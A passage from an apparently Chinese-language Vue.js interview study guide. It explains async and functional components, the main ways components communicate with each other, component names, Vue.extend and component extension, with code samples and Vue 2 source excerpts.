Class&lt;Component&gt; | Function | Object | void, data: ?VNodeData, context: Component, children: ?Array&lt;VNode&gt;, tag?: string ): VNode | Array&lt;VNode&gt; | void { \\n    // async component \\n    let asyncFactory \\n    if (isUndef(Ctor.cid)) { \\n        asyncFactory = Ctor \\n        Ctor = resolveAsyncComponent(asyncFactory, baseCtor) // 默认调用此函数时返回 undefiend \\n        // 第二次渲染时Ctor不为undefined \\n        if (Ctor === undefined) { \\n            return createAsyncPlaceholder( // 渲染占位符 空虚拟节点 \\n                asyncFactory, \\n                data, \\n                context, \\n                children, \\n                tag \\n            ) \\n        } \\n    } \\n}\\nfunction resolveAsyncComponent ( factory: Function, baseCtor: Class&lt;Component&gt; ): Class&lt;Component&gt; | void { \\n    if (isDef(factory.resolved)) { \\n        // 3.在次渲染时可以拿到获取的最新组件 \\n        return factory.resolved \\n    }\\n    const resolve = once((res: Object | Class&lt;Component&gt;) =&gt; { \\n        factory.resolved = ensureCtor(res, baseCtor) \\n        if (!sync) { \\n            forceRender(true) //2. 强制更新视图重新渲染 \\n        } else { \\n            owners.length = 0 \\n        } \\n    })\\n    const reject = once(reason =&gt; { \\n        if (isDef(factory.errorComp)) { \\n            factory.error = true forceRender(true) \\n        } \\n    })\\n    const res = factory(resolve, reject)// 1.将resolve方法和reject方法传入，用户调用 resolve方法后 \\n    sync = false \\n    return factory.resolved \\n}\\n</code></pre>\\n<h3 id=\\"函数式组件优势和原理\\"><a class=\\"header-anchor\\" href=\\"#函数式组件优势和原理\\">#</a> 函数式组件优势和原理</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>Vue 2</code> 的函数式组件用 <code>functional: true</code>，没有组件实例、响应式状态和生命周期，只根据上下文返回 <code>VNode</code></li>\\n<li>它省掉实例初始化和生命周期成本，适合无状态、纯展示或包装型组件</li>\\n<li><code>Vue 3</code> 中普通函数就能作为函数组件，而且普通有状态组件的实例开销已大幅降低，不应照搬 <code>Vue 2</code> 的性能结论</li>\\n<li>边界是没有 <code>this</code>、本地状态和实例钩子；需要这些能力时就用普通组件</li>\\n</ul>\\n<p><strong><code>Vue 2</code> 的函数式组件通过 <code>functional: true</code> 声明，它不创建组件实例，只根据传入的上下文返回 <code>VNode</code>。</strong> 因为没有 <code>this</code>、响应式状态和生命周期，也不会安装普通组件的管理钩子，所以初始化更轻，代码结构也更简单。它适合纯展示、容器或高阶包装这类无状态组件。代价是不能使用本地状态、计算属性、<code>watch</code> 和实例钩子，需要这些能力时应改用普通组件。</p>\\n</section>\\n<p><strong>函数组件的特点</strong></p>\\n<ol>\\n<li>函数式组件需要在声明组件是指定 <code>functional:true</code></li>\\n<li>不需要实例化，所以没有<code>this</code>,<code>this</code>通过<code>render</code>函数的第二个参数<code>context</code>来代替</li>\\n<li>没有生命周期钩子函数，不能使用计算属性，<code>watch</code></li>\\n<li>不能通过<code>$emit</code> 对外暴露事件，调用事件只能通过<code>context.listeners.click</code>的方式调用外部传入的事件</li>\\n<li>因为函数式组件是没有实例化的，所以在外部通过<code>ref</code>去引用组件时，实际引用的是<code>HTMLElement</code></li>\\n<li>函数式组件的<code>props</code>可以不用显示声明，所以没有在<code>props</code>里面声明的属性都会被自动隐式解析为<code>prop</code>,而普通组件所有未声明的属性都解析到<code>$attrs</code>里面，并自动挂载到组件根元素上面(可以通过<code>inheritAttrs</code>属性禁止)</li>\\n</ol>\\n<p><strong>优点</strong></p>\\n<ol>\\n<li>由于函数式组件不需要实例化，无状态，没有生命周期，所以渲染性能要好于普通组件</li>\\n<li>函数式组件结构比较简单，代码结构更清晰</li>\\n</ol>\\n<p><strong>使用场景：</strong></p>\\n<ul>\\n<li>一个简单的展示组件，作为容器组件使用 比如 <code>router-view</code> 就是一个函数式组件</li>\\n<li>“高阶组件”——用于接收一个组件作为参数，返回一个被包装过的组件</li>\\n</ul>\\n<p>例子</p>\\n<pre class=\\"language-js\\"><code>Vue.component(&#39;functional&#39;,{ // 构造函数产生虚拟节点的\\n    functional:true, // 函数式组件 // data={attrs:{}}\\n    render(h){\\n        return h(&#39;div&#39;,&#39;test&#39;)\\n    }\\n})\\nconst vm = new Vue({\\n    el: &#39;#app&#39;\\n})\\n</code></pre>\\n<p>源码相关</p>\\n<pre class=\\"language-js\\"><code>// functional component\\nif (isTrue(Ctor.options.functional)) { // 带有functional的属性的就是函数式组件\\n  return createFunctionalComponent(Ctor, propsData, data, context, children)\\n}\\n\\n// extract listeners, since these needs to be treated as\\n// child component listeners instead of DOM listeners\\nconst listeners = data.on // 处理事件\\n// replace with listeners with .native modifier\\n// so it gets processed during parent component patch.\\ndata.on = data.nativeOn // 处理原生事件\\n\\n// install component management hooks onto the placeholder node\\ninstallComponentHooks(data) // 安装组件相关钩子 （函数式组件没有调用此方法，从而性能高于普通组件）\\n</code></pre>\\n<h3 id=\\"vue组件之间通信方式有哪些\\"><a class=\\"header-anchor\\" href=\\"#vue组件之间通信方式有哪些\\">#</a> Vue组件之间通信方式有哪些</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>父子通信：父向子用 <code>props</code>，子向父用 <code>emit</code>；组件 <code>v-model</code> 本质是一组值与更新事件</li>\\n<li>跨层级共享依赖用 <code>provide/inject</code>，但变更来源要收口，避免后代组件任意修改</li>\\n<li>跨页或多分支共享的业务状态用 <code>Pinia</code> / <code>Vuex</code>；单个组件树能解决时不要过早全局化</li>\\n<li><code>ref</code> / <code>expose</code> 是命令式能力出口，适合聚焦、播放等动作，不应代替常规数据流</li>\\n<li><code>EventBus</code> 会隐藏依赖与清理时机，在 <code>Vue 3</code> 中也已没有实例 <code>$on/$off</code>，新代码优先显式协议</li>\\n</ul>\\n<p><strong><code>Vue</code> 组件通信要按关系选择：父子用 <code>props</code> 和 <code>emit</code>，跨层用 <code>provide/inject</code>，复杂共享状态用 <code>Pinia</code> 或 <code>Vuex</code>。</strong> 组件 <code>v-model</code> 本质上也是值与更新事件的组合，适合封装双向交互。<code>ref</code> 和 <code>expose</code> 更适合聚焦、播放这类命令式操作，不宜替代正常数据流。<code>EventBus</code>、<code>$parent</code> 等方式依赖隐蔽且难维护，新代码应优先使用显式通信协议。</p>\\n</section>\\n<blockquote>\\n<p>Vue 组件间通信是面试常考的知识点之一，这题有点类似于开放题，你回答出越多方法当然越加分，表明你对 Vue 掌握的越熟练。<strong>Vue 组件间通信只要指以下 3 类通信</strong>：<code>父子组件通信</code>、<code>隔代组件通信</code>、<code>兄弟组件通信</code>，下面我们分别介绍每种通信方式且会说明此种方法可适用于哪类组件间通信</p>\\n</blockquote>\\n<p><strong>组件传参的各种方式</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/e6c7ede9c5ab6d49.png\\" alt=\\"\\"></p>\\n<p><strong>组件通信常用方式有以下几种</strong></p>\\n<ul>\\n<li><code>props / $emit</code> <strong>适用 父子组件通信</strong>\\n<ul>\\n<li>父组件向子组件传递数据是通过 <code>prop</code> 传递的，子组件传递数据给父组件是通过<code>$emit</code> 触发事件来做到的</li>\\n</ul>\\n</li>\\n<li><code>ref</code> 与 <code>$parent / $children(vue3废弃)</code> <strong>适用 父子组件通信</strong>\\n<ul>\\n<li><code>ref</code>：如果在普通的 <code>DOM</code> 元素上使用，引用指向的就是 <code>DOM</code> 元素；如果用在子组件上，引用就指向组件实例</li>\\n<li><code>$parent / $children</code>：访问访问父组件的属性或方法 / 访问子组件的属性或方法</li>\\n</ul>\\n</li>\\n<li><code>EventBus （$emit / $on）</code> <strong>适用于 父子、隔代、兄弟组件通信</strong>\\n<ul>\\n<li>这种方法通过一个空的 <code>Vue</code> 实例作为中央事件总线（事件中心），用它来触发事件和监听事件，从而实现任何组件间的通信，包括父子、隔代、兄弟组件</li>\\n</ul>\\n</li>\\n<li><code>$attrs / $listeners(vue3废弃)</code> <strong>适用于 隔代组件通信</strong>\\n<ul>\\n<li><code>$attrs</code>：包含了父作用域中不被 <code>prop</code> 所识别 (且获取) 的特性绑定 ( <code>class</code> 和 <code>style</code> 除外 )。当一个组件没有声明任何 <code>prop</code> 时，这里会包含所有父作用域的绑定 ( <code>class</code> 和 <code>style</code> 除外 )，并且可以通过 <code>v-bind=&quot;$attrs&quot;</code> 传入内部组件。通常配合 <code>inheritAttrs</code> 选项一起使用，多余的属性不会被解析到标签上</li>\\n<li><code>$listeners</code>：包含了父作用域中的 (不含 <code>.native</code> 修饰器的) <code>v-on</code> 事件监听器。它可以通过 <code>v-on=&quot;$listeners&quot;</code> 传入内部组件</li>\\n</ul>\\n</li>\\n<li><code>provide / inject</code> <strong>适用于 隔代组件通信</strong>\\n<ul>\\n<li>祖先组件中通过 <code>provider</code> 来提供变量，然后在子孙组件中通过 <code>inject</code> 来注入变量。 <code>provide / inject</code> API 主要解决了跨级组件间的通信问题，<strong>不过它的使用场景，主要是子组件获取上级组件的状态</strong>，跨级组件间建立了一种主动提供与依赖注入的关系</li>\\n</ul>\\n</li>\\n<li><code>$root</code> <strong>适用于 隔代组件通信</strong> 访问根组件中的属性或方法，是根组件，不是父组件。<code>$root</code>只对根组件有用</li>\\n<li><code>Vuex</code> <strong>适用于 父子、隔代、兄弟组件通信</strong>\\n<ul>\\n<li><code>Vuex</code> 是一个专为 <code>Vue.js</code> 应用程序开发的状态管理模式。每一个 <code>Vuex</code> 应用的核心就是 <code>store</code>（仓库）。“store” 基本上就是一个容器，它包含着你的应用中大部分的状态 ( <code>state</code> )</li>\\n<li><code>Vuex</code> 的状态存储是响应式的。当 <code>Vue</code> 组件从 <code>store</code> 中读取状态的时候，若 <code>store</code> 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</li>\\n<li>改变 <code>store</code> 中的状态的唯一途径就是显式地提交  (<code>commit</code>) <code>mutation</code>。这样使得我们可以方便地跟踪每一个状态的变化。</li>\\n</ul>\\n</li>\\n</ul>\\n<p><strong>根据组件之间关系讨论组件通信最为清晰有效</strong></p>\\n<ul>\\n<li>父子组件：<code>props</code>/<code>$emit</code>/<code>$parent</code>/<code>ref</code></li>\\n<li>兄弟组件：<code>$parent</code>/<code>eventbus</code>/<code>vuex</code></li>\\n<li>跨层级关系：<code>eventbus</code>/<code>vuex</code>/<code>provide+inject</code>/<code>$attrs + $listeners</code>/<code>$root</code></li>\\n</ul>\\n<blockquote>\\n<p>下面演示组件之间通讯三种情况: 父传子、子传父、兄弟组件之间的通讯</p>\\n</blockquote>\\n<p><strong>1. 父子组件通信</strong></p>\\n<blockquote>\\n<p>使用<code>props</code>，父组件可以使用<code>props</code>向子组件传递数据。</p>\\n</blockquote>\\n<p>父组件<code>vue</code>模板<code>father.vue</code>:</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;child :msg=&quot;message&quot;&gt;&lt;/child&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport child from &#39;./child.vue&#39;;\\nexport default {\\n  components: {\\n    child\\n  },\\n  data () {\\n    return {\\n      message: &#39;father message&#39;;\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p>子组件<code>vue</code>模板<code>child.vue</code>:</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;div&gt;{{msg}}&lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n  props: {\\n    msg: {\\n      type: String,\\n      required: true\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>回调函数（callBack）</strong></p>\\n<p>父传子：将父组件里定义的<code>method</code>作为<code>props</code>传入子组件</p>\\n<pre class=\\"language-js\\"><code>// 父组件Parent.vue：\\n&lt;Child :changeMsgFn=&quot;changeMessage&quot;&gt;\\nmethods: {\\n\\tchangeMessage(){\\n\\t\\tthis.message = &#39;test&#39;\\n\\t}\\n}\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 子组件Child.vue：\\n&lt;button @click=&quot;changeMsgFn&quot;&gt;\\nprops:[&#39;changeMsgFn&#39;]\\n</code></pre>\\n<p><strong>子组件向父组件通信</strong></p>\\n<blockquote>\\n<p>父组件向子组件传递事件方法，子组件通过<code>$emit</code>触发事件，回调给父组件</p>\\n</blockquote>\\n<p>父组件<code>vue</code>模板<code>father.vue</code>:</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;child @msgFunc=&quot;func&quot;&gt;&lt;/child&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport child from &#39;./child.vue&#39;;\\nexport default {\\n    components: {\\n        child\\n    },\\n    methods: {\\n        func (msg) {\\n            console.log(msg);\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p>子组件<code>vue</code>模板<code>child.vue</code>:</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;button @click=&quot;handleClick&quot;&gt;点我&lt;/button&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    props: {\\n        msg: {\\n            type: String,\\n            required: true\\n        }\\n    },\\n    methods () {\\n        handleClick () {\\n          //........\\n          this.$emit(&#39;msgFunc&#39;);\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>2. provide / inject 跨级访问祖先组件的数据</strong></p>\\n<p>父组件通过使用<code>provide(){return{}}</code>提供需要传递的数据</p>\\n<pre class=\\"language-js\\"><code>export default {\\n  data() {\\n    return {\\n      title: &#39;我是父组件&#39;,\\n      name: &#39;poetry&#39;\\n    }\\n  },\\n  methods: {\\n    say() {\\n      alert(1)\\n    }\\n  },\\n  // provide属性 能够为后面的后代组件/嵌套的组件提供所需要的变量和方法\\n  provide() {\\n    return {\\n      message: &#39;我是祖先组件提供的数据&#39;,\\n      name: this.name, // 传递属性\\n      say: this.say\\n    }\\n  }\\n}\\n</code></pre>\\n<p>子组件通过使用<code>inject:[“参数1”,”参数2”,…]</code>接收父组件传递的参数</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;p&gt;曾孙组件&lt;/p&gt;\\n  &lt;p&gt;{{message}}&lt;/p&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default {\\n  // inject 注入/接收祖先组件传递的所需要的数据即可 \\n  //接收到的数据 变量 跟data里面的变量一样 可以直接绑定到页面 {}\\n  inject: [ &quot;message&quot;,&quot;say&quot;],\\n  mounted() {\\n    this.say();\\n  },\\n};\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>3. $parent + $children 获取父组件实例和子组件实例的集合</strong></p>\\n<ul>\\n<li><code>this.$parent</code> 可以直接访问该组件的父实例或组件</li>\\n<li>父组件也可以通过 <code>this.$children</code> 访问它所有的子组件；需要注意 <code>$children</code> 并不保证顺序，也不是响应式的</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;!-- parent.vue --&gt;\\n&lt;template&gt;\\n&lt;div&gt;\\n  &lt;child1&gt;&lt;/child1&gt;   \\n  &lt;child2&gt;&lt;/child2&gt; \\n  &lt;button @click=&quot;clickChild&quot;&gt;$children方式获取子组件值&lt;/button&gt;\\n&lt;/div&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nimport child1 from &#39;./child1&#39;\\nimport child2 from &#39;./child2&#39;\\nexport default {\\n  data(){\\n    return {\\n      total: 108\\n    }\\n  },\\n  components: {\\n    child1,\\n    child2  \\n  },\\n  methods: {\\n    funa(e){\\n      console.log(&quot;index&quot;,e)\\n    },\\n    clickChild(){\\n      console.log(this.$children[0].msg);\\n      console.log(this.$children[1].msg);\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- child1.vue --&gt;\\n&lt;template&gt;\\n  &lt;div&gt;\\n    &lt;button @click=&quot;parentClick&quot;&gt;点击访问父组件&lt;/button&gt;\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default {\\n  data(){\\n    return {\\n      msg:&quot;child1&quot;\\n    }\\n  },\\n  methods: {\\n    // 访问父组件数据\\n    parentClick(){\\n      this.$parent.funa(&quot;xx&quot;)\\n      console.log(this.$parent.total);\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- child2.vue --&gt;\\n&lt;template&gt;\\n  &lt;div&gt;\\n    child2\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default {\\n  data(){\\n    return {\\n     msg: &#39;child2&#39;\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>4. $attrs + $listeners多级组件通信</strong></p>\\n<blockquote>\\n<p><code>$attrs</code> 包含了从父组件传过来的所有<code>props</code>属性</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>// 父组件Parent.vue：\\n&lt;Child :name=&quot;name&quot; :age=&quot;age&quot;/&gt;\\n    \\n// 子组件Child.vue：\\n&lt;GrandChild v-bind=&quot;$attrs&quot; /&gt;\\n\\n// 孙子组件GrandChild\\n&lt;p&gt;姓名：{{$attrs.name}}&lt;/p&gt;\\n&lt;p&gt;年龄：{{$attrs.age}}&lt;/p&gt;\\n</code></pre>\\n<blockquote>\\n<p><code>$listeners</code>包含了父组件监听的所有事件</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>// 父组件Parent.vue：\\n&lt;Child :name=&quot;name&quot; :age=&quot;age&quot; @changeNameFn=&quot;changeName&quot;/&gt;\\n    \\n// 子组件Child.vue：\\n&lt;button @click=&quot;$listeners.changeNameFn&quot;&gt;&lt;/button&gt;\\n</code></pre>\\n<p><strong>5. ref 父子组件通信</strong></p>\\n<pre class=\\"language-js\\"><code>// 父组件Parent.vue：\\n&lt;Child ref=&quot;childComp&quot;/&gt;\\n&lt;button @click=&quot;changeName&quot;&gt;&lt;/button&gt;\\nchangeName(){\\n\\tconsole.log(this.$refs.childComp.age);\\n\\tthis.$refs.childComp.changeAge()\\n}\\n\\n// 子组件Child.vue：\\ndata(){\\n\\treturn{\\n\\t\\tage:20\\n\\t}\\n},\\nmethods(){\\n\\tchangeAge(){\\n\\t\\tthis.age=15\\n  }\\n}\\n</code></pre>\\n<p><strong>6. 非父子, 兄弟组件之间通信</strong></p>\\n<blockquote>\\n<p><code>vue2</code>中废弃了<code>broadcast</code>广播和分发事件的方法。父子组件中可以用<code>props</code>和<code>$emit()</code>。如何实现非父子组件间的通信，可以通过实例一个<code>vue</code>实例<code>Bus</code>作为媒介，要相互通信的兄弟组件之中，都引入<code>Bus</code>，然后通过分别调用Bus事件触发和监听来实现通信和参数传递。<code>Bus.js</code>可以是这样:</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>// Bus.js\\n\\n// 创建一个中央时间总线类  \\nclass Bus {  \\n  constructor() {  \\n    this.callbacks = {};   // 存放事件的名字  \\n  }  \\n  $on(name, fn) {  \\n    this.callbacks[name] = this.callbacks[name] || [];  \\n    this.callbacks[name].push(fn);  \\n  }  \\n  $emit(name, args) {  \\n    if (this.callbacks[name]) {  \\n      this.callbacks[name].forEach((cb) =&gt; cb(args));  \\n    }  \\n  }  \\n}  \\n  \\n// main.js  \\nVue.prototype.$bus = new Bus() // 将$bus挂载到vue实例的原型上  \\n// 另一种方式  \\nVue.prototype.$bus = new Vue() // Vue已经实现了Bus的功能  \\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n\\t&lt;button @click=&quot;toBus&quot;&gt;子组件传给兄弟组件&lt;/button&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default{\\n\\tmethods: {\\n    toBus () {\\n      this.$bus.$emit(&#39;foo&#39;, &#39;来自兄弟组件&#39;)\\n    }\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p>另一个组件也在钩子函数中监听<code>on</code>事件</p>\\n<pre class=\\"language-js\\"><code>export default {\\n  data() {\\n    return {\\n      message: &#39;&#39;\\n    }\\n  },\\n  mounted() {\\n    this.$bus.$on(&#39;foo&#39;, (msg) =&gt; {\\n      this.message = msg\\n    })\\n  }\\n}\\n</code></pre>\\n<p><strong>7. $root 访问根组件中的属性或方法</strong></p>\\n<ul>\\n<li>作用：访问根组件中的属性或方法</li>\\n<li>注意：是根组件，不是父组件。<code>$root</code>只对根组件有用</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>var vm = new Vue({\\n  el: &quot;#app&quot;,\\n  data() {\\n    return {\\n      rootInfo:&quot;我是根元素的属性&quot;\\n    }\\n  },\\n  methods: {\\n    alerts() {\\n      alert(111)\\n    }\\n  },\\n  components: {\\n    com1: {\\n      data() {\\n        return {\\n          info: &quot;组件1&quot;\\n        }\\n      },\\n      template: &quot;&lt;p&gt;{{ info }} &lt;com2&gt;&lt;/com2&gt;&lt;/p&gt;&quot;,\\n      components: {\\n        com2: {\\n          template: &quot;&lt;p&gt;我是组件1的子组件&lt;/p&gt;&quot;,\\n          created() {\\n            this.$root.alerts()// 根组件方法\\n            console.log(this.$root.rootInfo)// 我是根元素的属性\\n          }\\n        }\\n      }\\n    }\\n  }\\n});\\n</code></pre>\\n<p><strong>8. vuex</strong></p>\\n<ul>\\n<li>适用场景: 复杂关系的组件数据传递</li>\\n<li>Vuex作用相当于一个用来存储共享变量的容器</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/b96d3c0fcf648316.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><code>state</code>用来存放共享变量的地方</li>\\n<li><code>getter</code>，可以增加一个<code>getter</code>派生状态，(相当于<code>store</code>中的计算属性），用来获得共享变量的值</li>\\n<li><code>mutations</code>用来存放修改<code>state</code>的方法。</li>\\n<li><code>actions</code>也是用来存放修改state的方法，不过<code>action</code>是在<code>mutations</code>的基础上进行。常用来做一些异步操作</li>\\n</ul>\\n<p><strong>小结</strong></p>\\n<ul>\\n<li>父子关系的组件数据传递选择 <code>props</code> 与 <code>$emit</code>进行传递，也可选择<code>ref</code></li>\\n<li>兄弟关系的组件数据传递可选择<code>$bus</code>，其次可以选择<code>$parent</code>进行传递</li>\\n<li>祖先与后代组件数据传递可选择<code>attrs</code>与<code>listeners</code>或者 <code>Provide</code>与 <code>Inject</code></li>\\n<li>复杂关系的组件数据传递可以通过<code>vuex</code>存放共享的变量</li>\\n</ul>\\n<h3 id=\\"组件中写name属性的好处\\"><a class=\\"header-anchor\\" href=\\"#组件中写name属性的好处\\">#</a> 组件中写name属性的好处</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>组件 <code>name</code> 是运行时身份，会出现在 <code>Vue Devtools</code>、警告组件链和错误追踪中，方便定位</li>\\n<li>递归组件在 <code>Vue 2</code> 中可通过 <code>name</code> 在自己的模板里引用自身</li>\\n<li><code>&lt;KeepAlive&gt;</code> 的 <code>include/exclude</code> 会按组件名匹配，稳定的 <code>name</code> 能让缓存策略可控</li>\\n<li><code>Vue 3.3+</code> 的 <code>&lt;script setup&gt;</code> 可用 <code>defineOptions({ name })</code> 显式声明；文件名推断不应成为关键业务逻辑的唯一依赖</li>\\n</ul>\\n<p><strong>组件的 <code>name</code> 相当于运行时标识，能让调试、组件查找和递归引用更清楚。</strong> 在 <code>Vue Devtools</code>、警告组件链或错误追踪中，明确的名称比匿名组件更容易定位。<code>Vue 2</code> 的递归组件可以通过 <code>name</code> 引用自身，<code>KeepAlive</code> 的 <code>include/exclude</code> 也会按组件名匹配，因此涉及递归或缓存策略时最好显式声明。</p>\\n</section>\\n<blockquote>\\n<p>可以标识组件的具体名称方便调试和查找对应属性</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>// 源码位置 src/core/global-api/extend.js\\n\\n// enable recursive self-lookup\\nif (name) { \\n    Sub.options.components[name] = Sub // 记录自己 在组件中递归自己  -&gt; jsx\\n}\\n</code></pre>\\n<h3 id=\\"vue-extend-作用和原理\\"><a class=\\"header-anchor\\" href=\\"#vue-extend-作用和原理\\">#</a> Vue.extend 作用和原理</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>Vue.extend</code> 是 <code>Vue 2</code> 的子类构造器工厂：传入组件选项，返回一个可用 <code>new</code> 实例化的组件构造器</li>\\n<li>原理是建立原型继承，合并父类与子类 <code>options</code>，分配 <code>cid</code>，并缓存同一组选项生成的构造器</li>\\n<li>它常用于程序化创建通知、弹窗等组件，也是 <code>Vue 2</code> 内部把组件选项对象转成构造器的重要一步</li>\\n<li><code>Vue 3</code> 已移除 <code>Vue.extend</code>，程序化挂载改用 <code>createVNode</code> + <code>render</code>，或者封装独立 <code>createApp</code></li>\\n</ul>\\n<p><strong><code>Vue.extend</code> 用于基于 <code>Vue</code> 构造器和一份组件选项创建子类构造器，返回结果可以通过 <code>new</code> 实例化。</strong> 它的核心是原型继承，并通过 <code>mergeOptions</code> 合并父类与子类的配置，同时为构造器分配 <code>cid</code>。在 <code>Vue 2</code> 中，它既是组件选项转成构造器的重要环节，也常用于程序化创建弹窗、通知等组件。<code>Vue 3</code> 已移除这个 <code>API</code>，可改用 <code>createVNode</code> 配合 <code>render</code>，或创建独立应用实例。</p>\\n</section>\\n<blockquote>\\n<p>官方解释：<code>Vue.extend</code> 使用基础 <code>Vue</code> 构造器，创建一个“子类”。参数是一个包含组件选项的对象。</p>\\n</blockquote>\\n<p>其实就是一个子类构造器 是 <code>Vue</code> 组件的核心 <code>api</code> 实现思路就是使用原型继承的方法返回了 Vue 的子类 并且利用 <code>mergeOptions</code> 把传入组件的 <code>options</code> 和父类的 <code>options</code> 进行了合并</p>\\n<ul>\\n<li><code>extend</code>是构造一个组件的语法器。然后这个组件你可以作用到<code>Vue.component</code>这个全局注册方法里还可以在任意<code>vue</code>模板里使用组件。\\n也可以作用到<code>vue</code>实例或者某个组件中的<code>components</code>属性中并在内部使用<code>apple</code>组件。</li>\\n<li><code>Vue.component</code>你可以创建 ，也可以取组件。</li>\\n</ul>\\n<p>相关代码如下</p>\\n<pre class=\\"language-js\\"><code>export default function initExtend(Vue) {\\n  let cid = 0; //组件的唯一标识\\n  // 创建子类继承Vue父类 便于属性扩展\\n  Vue.extend = function (extendOptions) {\\n    // 创建子类的构造函数 并且调用初始化方法\\n    const Sub = function VueComponent(options) {\\n      this._init(options); //调用Vue初始化方法\\n    };\\n    Sub.cid = cid++;\\n    Sub.prototype = Object.create(this.prototype); // 子类原型指向父类\\n    Sub.prototype.constructor = Sub; //constructor指向自己\\n    Sub.options = mergeOptions(this.options, extendOptions); //合并自己的options和父类的options\\n    return Sub;\\n  };\\n}\\n</code></pre>\\n<h3 id=\\"vue中如何扩展一个组件\\"><a class=\\"header-anchor\\" href=\\"#vue中如何扩展一个组件\\">#</a> Vue中如何扩展一个组件</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>组合优先：通过 <code>props</code> 配置、<code>slots</code> 注入内容、<code>emit</code> 暴露事件，通常比继承更显式</li>\\n<li>逻辑复用：<code>Vue 3</code> 用组合式函数（<code>composable</code>）；<code>Vue 2</code> 历史代码可见 <code>mixins</code> / <code>extends</code></li>\\n<li>视图包装：高阶组件或外层包装适合统一权限、埋点和样式，但要透传 <code>$attrs</code> 与插槽</li>\\n<li>全局能力：插件适合应用级注入，不应为了改一个组件就污染 <code>globalProperties</code></li>\\n</ul>\\n<p><strong>扩展 <code>Vue</code> 组件通常分为逻辑复用和内容扩展：逻辑用组合式函数、<code>mixins</code> 或 <code>extends</code>，内容用插槽。</strong> <code>mixins</code> 能合并多份组件选项，<code>extends</code> 适合继承单个配置对象，但二者都可能让方法和数据的来源不够直观，甚至出现命名冲突。<code>Vue 3</code> 中我一般优先使用组合式函数，因为依赖和返回值更明确；需要让调用方替换或补充视图时，则使用默认插槽、具名插槽或作用域插槽。</p>\\n</section>\\n<p>此题属于实践题，考察大家对vue常用api使用熟练度，答题时不仅要列出这些解决方案，同时最好说出他们异同</p>\\n<p><strong>答题思路：</strong></p>\\n<ul>\\n<li>按照逻辑扩展和内容扩展来列举\\n<ul>\\n<li>逻辑扩展有：<code>mixins</code>、<code>extends</code>、<code>composition api</code></li>\\n<li>内容扩展有<code>slots</code>；</li>\\n</ul>\\n</li>\\n<li>分别说出他们使用方法、场景差异和问题。</li>\\n<li>作为扩展，还可以说说<code>vue3</code>中新引入的<code>composition api</code>带来的变化</li>\\n</ul>\\n<p><strong>回答范例：</strong></p>\\n<ol>\\n<li>常见的组件扩展方法有：<code>mixins</code>，<code>slots</code>，<code>extends</code>等</li>\\n<li>混入<code>mixins</code>是分发 <code>Vue</code> 组件中可复用功能的非常灵活的方式。混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 复用代码：它是一个配置对象，选项和组件里面一样\\nconst mymixin = {\\n   methods: {\\n      dosomething(){}\\n   }\\n}\\n// 全局混入：将混入对象传入\\nVue.mixin(mymixin)\\n\\n// 局部混入：做数组项设置到mixins选项，仅作用于当前组件\\nconst Comp = {\\n   mixins: [mymixin]\\n}\\n</code></pre>\\n<ol start=\\"3\\">\\n<li>插槽主要用于<code>vue</code>组件中的内容分发，也可以用于组件扩展</li>\\n</ol>\\n<p>子组件Child</p>\\n<pre class=\\"language-html\\"><code>&lt;div&gt;\\n  &lt;slot&gt;这个内容会被父组件传递的内容替换&lt;/slot&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>父组件Parent</p>\\n<pre 